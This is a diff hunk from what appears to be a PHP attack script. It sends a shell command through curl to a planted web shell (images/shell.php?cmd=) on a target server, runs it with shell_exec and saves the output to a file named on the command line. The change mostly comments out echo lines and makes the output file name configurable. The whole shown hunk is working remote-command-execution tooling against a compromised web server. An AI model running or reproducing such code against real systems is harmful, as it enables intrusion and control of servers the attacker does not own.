@@ -88,17 +88,15 @@ if(curl_errno($curl)){
 
 $cmd = "curl -X GET ". IP_ADDRESS . "images/shell.php\?cmd\=";
 $shellcmd = $argv[3];
-echo $cmd.$shellcmd; 
-$result = shell_exec ($cmd.$shellcmd);
-$result_txt = "-------------------------------------------------------------\n".
-			"Now running the shell command '" . $shellcmd . "' on web server.\n".
-			"Result:\n".
-			"----------------\n".
-			$result;
+// echo $cmd.$shellcmd; 
+$result = shell_exec($cmd.$shellcmd);
+$result_txt = $result;
+// $result_txt = $result;
 			
-echo $result_txt;
+// echo $result_txt;
+$file_name = $argv[4];
 
-$resultfile = fopen("shell_injection.txt", "w") or die("Unable to open file!");
+$resultfile = fopen($file_name, "w") or die("Unable to open file!");
 fwrite($resultfile, $result_txt);
 
 fclose($resultfile);
